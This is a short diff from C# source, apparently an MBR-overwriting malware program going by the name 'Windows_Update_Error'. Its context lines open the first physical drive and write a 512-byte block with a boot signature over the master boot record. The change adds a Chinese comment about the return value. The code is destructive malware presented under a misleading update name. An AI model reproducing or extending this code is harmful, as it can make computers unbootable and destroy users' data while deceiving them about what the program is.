@@ -61,7 +61,7 @@ namespace Windows_Update_Error
             mbrdata[511] = 0xAA;
             IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0", Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL, Open_Existing, NULL, 0);
             bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);        //将mbrdata字节块中512字节写入mbr
-            if (x != false)
+            if (x != false)      //如果写入成功就返回1，否则为-1
             {
                 return 1;
             }
